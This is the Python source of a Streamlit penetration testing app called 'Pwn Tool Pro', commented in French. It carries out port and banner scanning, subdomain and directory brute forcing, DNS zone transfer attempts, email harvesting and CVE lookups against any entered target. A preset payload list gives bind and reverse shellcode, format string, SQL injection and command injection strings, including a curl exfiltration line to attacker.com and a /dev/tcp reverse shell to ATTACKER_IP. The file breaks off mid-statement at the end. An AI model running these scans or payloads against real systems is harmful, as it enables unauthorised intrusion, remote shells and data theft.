import streamlit as st

# Must be first
st.set_page_config(
    page_title="Pwn Tool",
    page_icon="🔥",
    layout="wide", 
    initial_sidebar_state="expanded"
)

# Import non-Streamlit modules first
import sys
import os
from datetime import datetime
from dotenv import load_dotenv
import socket
import requests
import re
from concurrent.futures import ThreadPoolExecutor
from googletrans import Translator

# Import pwntools context after Streamlit
from pwn_context import PWN_CONTEXT, PWN_ERROR
PWNCTX = PWN_CONTEXT
PWNTOOLS_ERROR = PWN_ERROR

# Import exploit generator early, but after Streamlit initialization
# Assurez-vous que ce module ne réimporte pas Streamlit
import exploit_generator
GENERATOR = exploit_generator.generator

def show_pwntools_error():
    """Affiche l'erreur d'initialisation de pwntools si elle existe"""
    if PWNTOOLS_ERROR and not PWNCTX:
        st.error(f"❌ Erreur d'initialisation pwntools: {PWNTOOLS_ERROR}")
        st.info("💡 Pour installer pwntools:\n```bash\npip install --upgrade pwntools\n```")
        return True
    return False

# Initialize context management functions
def init_context(arch='amd64', os='linux', log_level='debug'):
    """Initialise le contexte pwntools de manière sécurisée"""
    try:
        if PWNCTX:
            PWNCTX.arch = arch
            PWNCTX.os = os
            PWNCTX.log_level = log_level
            return True
        return False
    except Exception as e:
        st.error(f"❌ Erreur d'initialisation du contexte: {str(e)}")
        return False

# Initialize session state
if 'session_state' not in st.session_state:
    st.session_state['session_state'] = {
        'analysis_results': None,
        'selected_payload': None,
        'custom_payload': None,
    }

# Supprimer tout code existant lié à la sélection de langue
# Définir une seule fois le sélecteur de langue
def create_language_selector():
    lang_col1, lang_col2 = st.columns([6, 1])
    with lang_col2:
        return st.radio(
            label="Sélectionner la langue / Select language",
            options=["🇫🇷 FR", "🇬🇧 EN"]
        )

# Initialisation de la langue par défaut dans session_state
if 'language' not in st.session_state:
    st.session_state['language'] = "🇫🇷 FR"

# Définition de la variable current_lang basée sur le sélecteur de langue
current_lang = st.sidebar.radio(
    "Sélectionner la langue / Select language",
    ["🇫🇷 FR", "🇬🇧 EN"],
    key="language_selector"
)

# Mettre à jour la langue dans session_state
st.session_state['language'] = current_lang

def scan_port(host, port):
    """Scan d'un port avec gestion d'erreurs améliorée"""
    try:
        # Nettoyer l'URL pour obtenir le hostname
        if host.startswith(('http://', 'https://')):
            from urllib.parse import urlparse
            parsed = urlparse(host)
            host = parsed.netloc
            # Supprimer le port s'il est dans l'URL
            if ':' in host:
                host = host.split(':')[0]
        
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2)
            result = s.connect_ex((host, port))
            if result == 0:
                return port
            return None
    except socket.gaierror:
        st.error(f"❌ Erreur de résolution de nom pour: {host}")
        return None
    except socket.error as e:
        st.error(f"❌ Erreur de connexion: {str(e)}")
        return None

def get_service_banner(host, port, timeout=2):
    """Tente d'obtenir la bannière du service sur un port donné"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((host, port))
            # Envoie quelques requêtes communes
            probes = [
                b'HEAD / HTTP/1.0\r\n\r\n',
                b'GET / HTTP/1.0\r\n\r\n',
                b'\r\n',
                b'HELP\r\n',
                b'VERSION\r\n'
            ]
            banner = ''
            for probe in probes:
                try:
                    s.send(probe)
                    banner = s.recv(1024).decode('utf-8', errors='ignore')
                    if banner:
                        break
                except:
                    continue
            return banner.strip() if banner else "Service détecté, pas de bannière"
    except:
        return None

def service_detection(host, port):
    """Détecte le service en fonction du port et de la bannière"""
    common_ports = {
        21: "FTP",
        22: "SSH",
        23: "Telnet",
        25: "SMTP",
        80: "HTTP",
        443: "HTTPS",
        445: "SMB",
        3306: "MySQL",
        3389: "RDP",
        8080: "HTTP-Proxy"
    }
    banner = get_service_banner(host, port)
    service = common_ports.get(port, "Unknown")
    if banner:
        return f"Port {port} ({service}): {banner}"
    return f"Port {port} ({service}): Ouvert"

def auto_enum(target):
    """Énumération automatique de la cible avec plus de détails"""
    results = []
    try:
        # Nettoyage et validation de la cible
        domain = target
        if target.startswith(('http://', 'https://')):
            from urllib.parse import urlparse
            parsed = urlparse(target)
            domain = parsed.netloc
            # Supprimer le port s'il est dans l'URL
            if ':' in domain:
                domain = domain.split(':')[0]

        # Vérifier si le domaine est valide
        try:
            socket.gethostbyname(domain)
        except socket.gaierror:
            return f"❌ Erreur: Impossible de résoudre le domaine '{domain}'"

        results.append(f"🔍 Démarrage de l'analyse pour: {domain}")
        
        # Énumération des sous-domaines dans le thread principal
        results.append("\n📡 Recherche de sous-domains...")
        with st.spinner("Analyse des sous-domaines en cours..."):
            subdomains = enumerate_subdomains(domain)
            results.extend([f"  {line}" for line in subdomains.split('\n')])
        
        # Scan des ports
        results.append("\n🔍 Scan des ports...")
        common_ports = [21, 22, 23, 25, 80, 443, 445, 3306, 3389, 8080]
        
        # Utiliser un contexte de progression distinct
        scan_progress = st.empty()
        open_ports = []
        
        for i, port in enumerate(common_ports):
            scan_progress.progress((i + 1) / len(common_ports))
            result = scan_port(target, port)
            if result:
                open_ports.append(result)
        
        scan_progress.empty()

        if not open_ports:
            results.append("ℹ️ Aucun port ouvert trouvé")
        else:
            results.append(f"✅ Ports ouverts trouvés: {open_ports}")
            
        # Détection de version avec nmap si des ports sont ouverts
        if open_ports:
            results.append("\n🔍 Analyse des services en cours...")
            for port in open_ports:
                try:
                    service_info = service_detection(target, port)
                    results.append(service_info)
                except Exception as e:
                    results.append(f"⚠️ Erreur sur port {port}: {str(e)}")
    except Exception as e:
        results.append(f"❌ Erreur: {str(e)}")
    return "\n".join(results)

# Ajoutez cette fonction pour la traduction
def translate_text(text, dest='en'):
    translator = Translator()
    try:
        return translator.translate(text, dest=dest).text
    except:
        return text

def search_cves(service_info):
    """Recherche les CVE associées aux services détectés via NVD API"""
    cve_results = []
    cve_results.append("🔍 Démarrage de la recherche de vulnérabilités via NVD...")
    try:
        for line in service_info.split('\n'):
            if 'Port' in line:
                service_match = re.search(r'Port (\d+) \(([^)]+)\):(.*)', line)
                if service_match:
                    port = service_match.group(1)
                    service = service_match.group(2)
                    version_info = service_match.group(3).strip()
                    cve_results.append(f"\n📌 Analyse du service: {service} (Port {port})")
                    
                    # Construction de la requête NVD
                    base_url = "https://services.nvd.nist.gov/rest/json/cves/2.0"
                    params = {
                        "keywordSearch": f"{service}",
                        "resultsPerPage": 5
                    }
                    try:
                        response = requests.get(base_url, params=params, timeout=10)
                        if response.status_code == 200:
                            data = response.json()
                            vulns = data.get('vulnerabilities', [])
                            if not vulns:
                                cve_results.append(f"✅ Aucune vulnérabilité connue pour {service}")
                            else:
                                for vuln in vulns:
                                    cve = vuln['cve']
                                    cve_id = cve['id']
                                    description = cve.get('descriptions', [{}])[0].get('value', 'Pas de description')
                                    metrics = cve.get('metrics', {}).get('cvssMetricV31', [{}])[0]
                                    cvss_score = metrics.get('cvssData', {}).get('baseScore', 'N/A')
                                    
                                    # Convertir le score CVSS en nombre si possible
                                    try:
                                        cvss_score = float(cvss_score)
                                    except ValueError:
                                        cvss_score = 'N/A'
                                    
                                    # Émoji basé sur le score CVSS
                                    if isinstance(cvss_score, (int, float)):
                                        severity = "🔴" if cvss_score >= 7 else "🟡" if cvss_score >= 4 else "🟢"
                                    else:
                                        severity = "❓"
                                    
                                    cve_results.append(
                                        f"{severity} {cve_id} (CVSS: {cvss_score})\n"
                                        f"   └─ Description: {description[:200]}..."
                                    )
                        else:
                            cve_results.append(f"⚠️ Erreur API NVD: {response.status_code}")
                    except requests.exceptions.RequestException as e:
                        cve_results.append(f"⚠️ Erreur réseau: {str(e)}")
                        continue
        return "\n".join(cve_results)
    except Exception as e:
        return f"❌ Erreur globale: {str(e)}\n💡 Conseil: Vérifiez votre connexion Internet"

def load_subdomain_list():
    """Charge une liste de sous-domaines à partir d'un fichier distant"""
    try:
        url = "https://raw.githubusercontent.com/rbsec/dnscan/master/subdomains-10000.txt"
        response = requests.get(url)
        if (response.status_code == 200):
            return [line.strip() for line in response.text.splitlines() if line.strip()]
        return []
    except Exception as e:
        st.error(f"❌ Erreur lors du chargement de la liste des sous-domaines: {str(e)}")
        return []

def enumerate_subdomains(domain):
    """Énumère les sous-domaines d'un domaine donné avec une liste étendue"""
    subdomains = []
    found_count = 0
    max_subdomains = 100

    try:
        # Charger la liste des sous-domaines
        subdomain_list = load_subdomain_list()
        if not subdomain_list:
            return "Aucune liste de sous-domaines n'a pu être chargée"

        # Créer la barre de progression dans le contexte principal de Streamlit
        progress_placeholder = st.empty()
        total = len(subdomain_list)

        for i, sub in enumerate(subdomain_list):
            # Mise à jour de la progression
            progress = (i + 1) / total
            progress_placeholder.progress(progress)

            if found_count >= max_subdomains:
                subdomains.append(f"⚠️ Limite de {max_subdomains} sous-domaines atteinte")
                break

            subdomain = f"{sub}.{domain}"
            try:
                # Utiliser getaddrinfo au lieu de gethostbyname pour une meilleure fiabilité
                socket.getaddrinfo(subdomain, None)
                ip = socket.gethostbyname(subdomain)
                subdomains.append(f"✅ {subdomain:<50} -> {ip}")
                found_count += 1
            except socket.gaierror:
                continue
            except Exception as e:
                subdomains.append(f"❌ Erreur pour {subdomain}: {str(e)}")

        # Nettoyage de la barre de progression
        progress_placeholder.empty()

        if not subdomains:
            return "Aucun sous-domaine trouvé"

        summary = f"""
🔍 Résultats de l'énumération des sous-domaines pour {domain}:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✓ Sous-domaines trouvés: {found_count}
✓ Sous-domaines testés: {i + 1}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        return summary + "\n".join(subdomains)

    except Exception as e:
        return f"❌ Erreur lors de l'énumération: {str(e)}"

def detect_web_technologies(url):
    """Détecte les technologies utilisées sur un site web"""
    try:
        import requests
        from bs4 import BeautifulSoup
        import re
        
        # Vérifications de base
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        # Récupération de la page
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        response = requests.get(url, headers=headers, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Initialisation des résultats
        tech_stack = {
            "server": response.headers.get('Server', 'Unknown'),
            "technologies": [],
            "javascript_libraries": [],
            "cms": "Unknown",
            "analytics": [],
            "headers": dict(response.headers)
        }
        
        # Détection des frameworks/bibliothèques JS
        js_patterns = {
            "jQuery": r'jquery[.-](\d+\.\d+\.\d+)(?:\.min)?\.js',
            "React": r'react(?:-dom|-with-addons)?[.-](\d+\.\d+\.\d+)(?:\.min)?\.js',
            "Angular": r'angular[.-](\d+\.\d+\.\d+)(?:\.min)?\.js',
            "Vue.js": r'vue[.-](\d+\.\d+\.\d+)(?:\.min)?\.js',
            "Bootstrap": r'bootstrap[.-](\d+\.\d+\.\d+)(?:\.min)?\.js'
        }
        
        for script in soup.find_all('script', src=True):
            script_src = script['src']
            for tech, pattern in js_patterns.items():
                if re.search(pattern, script_src):
                    tech_stack["javascript_libraries"].append(tech)
        
        # Détection de CMS
        cms_patterns = {
            "WordPress": ["wp-content", "wp-includes", "wordpress"],
            "Joomla": ["joomla", "com_content"],
            "Drupal": ["drupal.js", "drupal.min.js"],
            "Magento": ["mage", "magento"],
            "Shopify": ["shopify", "myshopify.com"]
        }
        
        page_text = str(soup).lower()
        for cms, patterns in cms_patterns.items():
            for pattern in patterns:
                if pattern.lower() in page_text:
                    tech_stack["cms"] = cms
                    break
        
        # Détection d'outils d'analyse
        analytics_patterns = {
            "Google Analytics": ["google-analytics.com", "ga.js", "analytics.js", "gtag"],
            "Hotjar": ["hotjar", "hj.js"],
            "Matomo/Piwik": ["matomo", "piwik"],
            "Mixpanel": ["mixpanel"]
        }
        
        for analytics, patterns in analytics_patterns.items():
            for pattern in patterns:
                if pattern.lower() in page_text:
                    tech_stack["analytics"].append(analytics)
                    break
        
        # Autres technologies
        if 'X-Powered-By' in response.headers:
            tech_stack["technologies"].append(response.headers['X-Powered-By'])
        
        if soup.select('meta[name="generator"]'):
            generator = soup.select_one('meta[name="generator"]')['content']
            tech_stack["technologies"].append(f"Generator: {generator}")
        
        return tech_stack
        
    except Exception as e:
        return {"error": str(e)}

def directory_bruteforce(url):
    """Recherche des répertoires et fichiers courants sur un site web"""
    try:
        import requests
        import concurrent.futures
        
        # Liste commune de chemins à tester
        common_paths = [
            "/admin", "/login", "/wp-admin", "/dashboard", "/admin/login", 
            "/administrator", "/wp-login.php", "/user", "/cp", "/cpanel", 
            "/robots.txt", "/sitemap.xml", "/backup", "/phpmyadmin", 
            "/.env", "/.git/config", "/api", "/api/v1", "/console", 
            "/web.config", "/phpinfo.php", "/info.php", "/.htaccess",
            "/uploads", "/images", "/img", "/css", "/js", "/assets",
            "/config", "/database", "/db", "/logs", "/old", "/new",
            "/test", "/dev", "/staging"
        ]
        
        # Normaliser l'URL
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        # Supprimer le slash final si présent
        if url.endswith('/'):
            url = url[:-1]
        
        results = []
        results.append(f"🔍 Directory Bruteforce Results for: {url}\n")
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        def check_path(path):
            try:
                full_url = f"{url}{path}"
                response = requests.head(full_url, headers=headers, timeout=5, allow_redirects=True)
                
                if response.status_code < 400:
                    return f"✅ {response.status_code} - {full_url}"
                return None
            except Exception:
                return None
        
        # Utiliser ThreadPoolExecutor pour accélérer les requêtes
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            future_to_path = {executor.submit(check_path, path): path for path in common_paths}
            for future in concurrent.futures.as_completed(future_to_path):
                result = future.result()
                if result:
                    results.append(result)
        
        if len(results) == 1:
            results.append("❌ No accessible directories or files found.")
        
        return "\n".join(results)
        
    except Exception as e:
        return f"❌ Error during directory bruteforce: {str(e)}"

def analyze_http_headers(url):
    """Analyse des en-têtes HTTP pour détecter des problèmes de sécurité"""
    try:
        import requests
        
        # Normaliser l'URL
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        response = requests.get(url, headers=headers, timeout=10)
        
        results = []
        results.append(f"🔍 HTTP Headers Analysis for: {url}\n")
        results.append("==== Security Headers ====")
        
        # Headers de sécurité à vérifier
        security_headers = {
            'Strict-Transport-Security': 'Missing HSTS header. This header tells browsers to only use HTTPS.',
            'Content-Security-Policy': 'Missing CSP header. This helps prevent XSS attacks.',
            'X-Frame-Options': 'Missing X-Frame-Options header. This prevents clickjacking attacks.',
            'X-Content-Type-Options': 'Missing X-Content-Type-Options header. This prevents MIME-type sniffing.',
            'Referrer-Policy': 'Missing Referrer-Policy header. Controls how much referrer information is included with requests.',
            'X-XSS-Protection': 'Missing X-XSS-Protection header. This header can help prevent XSS in older browsers.',
            'Permissions-Policy': 'Missing Permissions-Policy header. This controls which browser features can be used.'
        }
        
        response_headers = response.headers
        
        for header, message in security_headers.items():
            if header in response_headers:
                results.append(f"✅ {header}: {response_headers[header]}")
            else:
                results.append(f"❌ {message}")
        
        # Informations sur le serveur (potentiellement sensibles)
        results.append("\n==== Server Information ====")
        if 'Server' in response_headers:
            results.append(f"⚠️ Server: {response_headers['Server']} - Consider hiding server information")
        if 'X-Powered-By' in response_headers:
            results.append(f"⚠️ X-Powered-By: {response_headers['X-Powered-By']} - Consider hiding technology information")
        
        # Cookies
        results.append("\n==== Cookies Analysis ====")
        if response.cookies:
            for cookie in response.cookies:
                cookie_info = []
                if not cookie.secure:
                    cookie_info.append("not secure")
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    cookie_info.append("not HttpOnly")
                if not cookie.has_nonstandard_attr('SameSite'):
                    cookie_info.append("no SameSite")
                
                if cookie_info:
                    results.append(f"⚠️ Cookie '{cookie.name}': {', '.join(cookie_info)}")
                else:
                    results.append(f"✅ Cookie '{cookie.name}': properly secured")
        else:
            results.append("No cookies found")
        
        return "\n".join(results)
        
    except Exception as e:
        return f"❌ Error analyzing HTTP headers: {str(e)}"

def enumerate_dns_records(domain):
    """Analyse des enregistrements DNS pour un domaine"""
    try:
        # Vérifier d'abord si le module dns est installé
        try:
            import dns.resolver
        except ImportError:
            return """❌ Module 'dns' non installé. 
            
Pour l'installer, exécutez :
```
pip install dnspython
```

Ce module est nécessaire pour l'énumération DNS."""
        
        import socket
        
        results = []
        results.append(f"🔍 DNS Enumeration Results for: {domain}\n")
        
        # Types d'enregistrements DNS à vérifier
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']
        
        resolver = dns.resolver.Resolver()
        resolver.timeout = 5
        resolver.lifetime = 5
        
        for record_type in record_types:
            try:
                answers = resolver.resolve(domain, record_type)
                results.append(f"=== {record_type} Records ===")
                for answer in answers:
                    results.append(f"✅ {answer}")
            except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
                results.append(f"❌ No {record_type} records found")
            except Exception as e:
                results.append(f"❌ Error querying {record_type} records: {str(e)}")
            
            results.append("")  # Empty line between record types
        
        # Zone Transfer attempt (rarely works but worth checking)
        results.append("=== Zone Transfer Attempt ===")
        try:
            ns_records = resolver.resolve(domain, 'NS')
            nameservers = [str(ns) for ns in ns_records]
            for ns in nameservers[:2]:  # Try just the first two nameservers
                try:
                    zone = dns.zone.from_xfr(dns.query.xfr(ns, domain, timeout=5))
                    results.append(f"⚠️ Zone transfer successful from {ns}! This is a security risk.")
                    for name, node in zone.nodes.items():
                        rdatasets = node.rdatasets
                        for rdataset in rdatasets:
                            results.append(f"  {name} {rdataset}")
                except:
                    results.append(f"✅ Zone transfer refused from {ns} (this is good)")
        except:
            results.append("❌ Could not test for zone transfers")
        
        return "\n".join(results)
        
    except Exception as e:
        return f"❌ Error during DNS enumeration: {str(e)}"

def analyze_ssl_tls(domain):
    """Analyse de la configuration SSL/TLS d'un domaine"""
    try:
        import socket
        import ssl
        import datetime
        
        results = []
        results.append(f"🔍 SSL/TLS Analysis for: {domain}\n")
        
        context = ssl.create_default_context()
        
        try:
            with socket.create_connection((domain, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    
                    # Version SSL/TLS
                    results.append(f"SSL/TLS Version: {ssock.version()}")
                    
                    # Cipher suite
                    cipher = ssock.cipher()
                    results.append(f"Cipher Suite: {cipher[0]}")
                    results.append(f"SSL/TLS Protocol: {cipher[1]}")
                    results.append(f"Bits: {cipher[2]}")
                    
                    # Certificate information
                    results.append("\n=== Certificate Information ===")
                    
                    # Issuer
                    issuer = dict(x[0] for x in cert['issuer'])
                    results.append(f"Issuer: {issuer.get('organizationName', 'Unknown')}")
                    
                    # Subject
                    subject = dict(x[0] for x in cert['subject'])
                    results.append(f"Organization: {subject.get('organizationName', 'Unknown')}")
                    results.append(f"Common Name: {subject.get('commonName', 'Unknown')}")
                    
                    # Validity dates
                    not_before = datetime.datetime.strptime(cert['notBefore'], '%b %d %H:%M:%S %Y %Z')
                    not_after = datetime.datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    now = datetime.datetime.now()
                    
                    results.append(f"Valid From: {not_before.strftime('%Y-%m-%d')}")
                    results.append(f"Valid Until: {not_after.strftime('%Y-%m-%d')}")
                    
                    # Certificate expiration check
                    days_left = (not_after - now).days
                    if days_left < 0:
                        results.append(f"❌ Certificate EXPIRED {abs(days_left)} days ago!")
                    elif days_left < 30:
                        results.append(f"⚠️ Certificate expires soon! Only {days_left} days left.")
                    else:
                        results.append(f"✅ Certificate valid for {days_left} more days")
                    
                    # SAN check
                    if 'subjectAltName' in cert:
                        results.append("\nSubject Alternative Names:")
                        for san_type, san_value in cert['subjectAltName']:
                            results.append(f"  {san_type}: {san_value}")
        
        except ssl.SSLError as e:
            results.append(f"❌ SSL Error: {str(e)}")
        except socket.error as e:
            results.append(f"❌ Socket Error: {str(e)}")
        
        return "\n".join(results)
        
    except Exception as e:
        return f"❌ Error during SSL/TLS analysis: {str(e)}"

def find_emails(domain):
    """Recherche d'adresses e-mail associées à un domaine sur le web"""
    try:
        import requests
        from bs4 import BeautifulSoup
        import re
        
        results = []
        results.append(f"🔍 Email Finder Results for: {domain}\n")
        
        # Regex for email matching
        email_pattern = r'[a-zA-Z0-9._%+-]+@' + re.escape(domain)
        
        # Search for emails on the main website
        try:
            url = f"https://{domain}"
            response = requests.get(url, timeout=10)
            emails_found = set(re.findall(email_pattern, response.text))
            
            if emails_found:
                results.append("=== Emails found on main website ===")
                for email in emails_found:
                    results.append(f"✉️ {email}")
            else:
                results.append("❌ No emails found on main website")
        except Exception as e:
            results.append(f"❌ Error scanning website: {str(e)}")
        
        # Search for emails on the contact page
        try:
            contact_url = f"https://{domain}/contact"
            response = requests.get(contact_url, timeout=10)
            emails_found = set(re.findall(email_pattern, response.text))
            
            if emails_found:
                results.append("\n=== Emails found on contact page ===")
                for email in emails_found:
                    results.append(f"✉️ {email}")
        except:
            # Contact page might not exist, ignore error
            pass
            
        # Check common email patterns
        results.append("\n=== Common email patterns to try ===")
        common_names = ["info", "contact", "admin", "support", "sales", "hello", "webmaster", "help"]
        for name in common_names:
            results.append(f"👤 {name}@{domain}")
        
        return "\n".join(results)
        
    except Exception as e:
        return f"❌ Error during email search: {str(e)}"

def extract_metadata(uploaded_file):
    """Extrait les métadonnées d'un fichier"""
    try:
        # Récupérer le type de fichier
        file_type = uploaded_file.type
        file_name = uploaded_file.name
        file_content = uploaded_file.read()
        
        metadata = {
            "filename": file_name,
            "size": len(file_content),
            "type": file_type,
            "extracted_metadata": {}
        }
        
        # Traitement selon le type de fichier
        if file_type.startswith("image/"):
            # Images
            from PIL import Image
            import io
            from PIL.ExifTags import TAGS
            
            img = Image.open(io.BytesIO(file_content))
            exif_data = img._getexif()
            
            if exif_data:
                for tag_id, value in exif_data.items():
                    tag = TAGS.get(tag_id, tag_id)
                    if isinstance(value, bytes):
                        try:
                            value = value.decode('utf-8', 'replace')
                        except:
                            value = str(value)
                    metadata["extracted_metadata"][tag] = str(value)
            
            # Dimensions de l'image
            metadata["extracted_metadata"]["dimensions"] = f"{img.width}x{img.height}"
            metadata["extracted_metadata"]["format"] = img.format
            metadata["extracted_metadata"]["mode"] = img.mode
            
        elif file_type == "application/pdf":
            # PDF
            import PyPDF2
            import io
            
            pdf_reader = PyPDF2.PdfReader(io.BytesIO(file_content))
            info = pdf_reader.metadata
            
            if info:
                for key, value in info.items():
                    metadata["extracted_metadata"][key[1:] if key.startswith('/') else key] = str(value)
            
            metadata["extracted_metadata"]["pages"] = len(pdf_reader.pages)
            
        elif file_type in ["application/vnd.openxmlformats-officedocument.wordprocessingml.document", "application/msword"]:
            # Word documents
            import docx
            import io
            
            doc = docx.Document(io.BytesIO(file_content))
            
            metadata["extracted_metadata"]["paragraphs"] = len(doc.paragraphs)
            metadata["extracted_metadata"]["sections"] = len(doc.sections)
            
            # Propriétés du document
            if hasattr(doc, 'core_properties'):
                props = doc.core_properties
                metadata["extracted_metadata"]["author"] = str(props.author) if props.author else "Unknown"
                metadata["extracted_metadata"]["created"] = str(props.created) if props.created else "Unknown"
                metadata["extracted_metadata"]["modified"] = str(props.modified) if props.modified else "Unknown"
                metadata["extracted_metadata"]["title"] = str(props.title) if props.title else "Unknown"
                
        return metadata
        
    except Exception as e:
        return {"error": str(e), "filename": uploaded_file.name if uploaded_file else "Unknown"}

# Style CSS pour l'interface moderne
st.markdown(
    """
    <style>
        .stApp {
            background-color: #000000;
        }
        .stTextInput, .stButton {
            margin-bottom: 15px;
        }
        .stTextInput > div > div > input, .stButton > button {
            border-radius: 5px;
            padding: 10px 15px;
            border: 1px solid #ccc;
        }
        .stButton > button {
            background-color: #007bff;
            color: white;
            border: none;
        }
        .stButton > button:hover {
            background-color: #0056b3;
        }
        .stTextArea > div > div > textarea {
            border-radius: 5px;
            padding: 10px 15px;
            border: 1px solid #ccc.
        }
    </style>
    """,
    unsafe_allow_html=True,
)

# Définition des textes selon la langue
texts = {
    "🇫🇷 FR": {
        "title": "🎯 Pwn Tool Pro",
        "target": "Cible (URL ou IP)",
        "analyze": "🚀 Analyse Automatique",
        "advanced": "🛠️ Options Avancées",
        "architecture": "Architecture",
        "shellcode": "Type de Shellcode",
        "port": "Port personnalisé",
        "payload": "Payload personnalisé (hex ou asm)",
        "presets": "Payloads prédéfinis",
        "generate": "⚡ Générer Exploit",
        "download": "📥 Télécharger le rapport",
        "warning": "⚠️ **Avertissement :** Utilisez cet outil de manière responsable et éthique.",
        "subdomain_scan": "🌐 Scanner les sous-domaines",
        "subdomain_results": "Résultats des sous-domaines",
        "loading_subdomains": "Chargement de la liste des sous-domaines...",
    },
    "🇬🇧 EN": {
        "title": "🎯 Pwn Tool Pro",
        "target": "Target (URL or IP)",
        "analyze": "🚀 Automatic Analysis",
        "advanced": "🛠️ Advanced Options",
        "architecture": "Architecture",
        "shellcode": "Shellcode Type",
        "port": "Custom Port",
        "payload": "Custom Payload (hex ou asm)",
        "presets": "Preset Payloads",
        "generate": "⚡ Generate Exploit",
        "download": "📥 Download Report",
        "warning": "⚠️ **Warning:** Use this tool responsibly and ethically.",
        "subdomain_scan": "🌐 Scan Subdomains",
        "subdomain_results": "Subdomain Results",
        "loading_subdomains": "Loading subdomain list...",
    }
}

# Définition du dictionnaire de payloads avant le reste de l'interface
payload_dict = {
    "Sélectionner...": {
        "code": "# Sélectionnez un payload dans la liste",
        "description": "Sélectionnez un payload prédéfini"
    },
    "Linux x64 - Bind Shell": {
        "code": """# 1. Générez le shellcode
shellcode = asm(shellcraft.amd64.linux.bindsh(4444))
# 2. Lancez un listener sur la machine cible (port 4444)
# 3. Connectez-vous avec : nc <target_ip> 4444""",
        "description": "Ouvre un shell sur le port 4444"
    },
    "Linux x64 - Reverse Shell": {
        "code": """# 1. Lancez un listener sur votre machine
# nc -lvnp 4444
# 2. Remplacez ATTACKER_IP par votre IP
shellcode = asm(shellcraft.amd64.linux.connectback('ATTACKER_IP', 4444))""",
        "description": "Se connecte à l'attaquant sur le port 4444",
    },
    "Linux x64 - Execute /bin/sh": {
        "code": """# 1. Générez le shellcode
shellcode = asm(shellcraft.amd64.linux.sh())
# 2. Pour exécuter directement:
# p = process('./binary')
# p.sendline(shellcode)
# p.interactive()""",
        "description": "Exécute /bin/sh"
    },
    "Format String - Stack Leak": {
        "code": """# 1. Envoyez le payload pour fuiter la pile
payload = b'%x.' * 20
# 2. Pour analyser la réponse:
# response = p.recvline()
# print(response.decode())
# 3. Pour trouver des adresses spécifiques:
# memory_leak = response.split(b'.')[offset]""",
        "description": "Fuite de la pile"
    },
    "Format String - Memory Write": {
        "code": """# 1. Calculez l'offset de votre cible
payload = b'AAAA' + b'%x ' * 10
# 2. Écrivez à l'adresse cible
target_addr = 0x0804xxxx
write_payload = fmtstr_payload(offset, {target_addr: desired_value})""",
        "description": "Écriture en mémoire via format string",
    },
    "Buffer Overflow - Pattern": {
        "code": """# 1. Créez un pattern unique
pattern = cyclic(1000)
# 2. Trouvez l'offset après crash
# offset = cyclic_find(0x6161616161)
# 3. Construisez votre payload
# payload = flat(
# )""",
        "description": "Pattern cyclique pour trouver l'offset"
    },
    "SQL Injection - Basic": {
        "code": """# 1. Test d'authentification basique
payload = "' OR '1'='1"
# 2. Variantes utiles:
# admin' --
# ' OR 1=1 --
# ' UNION SELECT 1,2,3 --""",
        "description": "Injection SQL basique"
    },
    "SQL Injection - Union": {
        "code": """# 1. Détection du nombre de colonnes (méthode sécurisée)
def detect_columns(url, max_columns=10):
    for i in range(1, max_columns + 1):
        payload = f"' ORDER BY {i}-- -"
        response = requests.get(url + payload)
        if "error" in response.text.lower():
            return i - 1
    return max_columns
# 2. Test des colonnes exploitables
def test_columns(url, num_columns):
    nulls = ','.join(['NULL'] * num_columns)
    payload = f"' UNION SELECT {nulls}-- -"
    return requests.get(url + payload)""",
        "description": "Injection SQL UNION avec validation et sécurité renforcée"
    },
    "Command Injection - Basic": {
        "code": """# 1. Test d'injection simple
payload = "$(id)"
# 2. Variantes utiles:
# ;id
# |id
# `id`
# $(cat /etc/passwd)""",
        "description": "Injection de commande simple"
    },
    "Command Injection - Advanced": {
        "code": """# 1. Encodage base64 pour bypass
payload = "`whoami`|base64"
# 2. Autres techniques de bypass:
# $(curl http://attacker.com/$(whoami))
# $(echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' | base64 -d | bash)""",
        "description": "Injection de commande avec encodage",
    }
}

# Mise à jour des textes de l'interface
st.title(texts[current_lang]["title"])
target = st.text_input(texts[current_lang]["target"])

if st.button(texts[current_lang]["analyze"]):
    if target:
        with st.spinner("Analyse en cours..."):
            # Analyse automatique
            analysis_results = auto_enum(target)
            # Afficher les résultats de l'énumération
            st.subheader("🔍 Résultats de l'énumération")
            st.code(analysis_results, language="text")
            # Rechercher et afficher les CVE
            st.subheader("🎯 Vulnérabilités potentielles (CVE)")
            with st.spinner("Recherche des CVE..."):
                cve_results = search_cves(analysis_results)
                st.code(cve_results, language="text")
            # Préparer le rapport complet
            full_report = f"""RAPPORT D'ANALYSE
============================
{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
============================
ÉNUMÉRATION
-----------
{analysis_results}

VULNÉRABILITÉS POTENTIELLES
---------------------------
{cve_results}
"""
            # Bouton de téléchargement
            st.download_button(
                label=texts[current_lang]["download"],
                data=full_report,
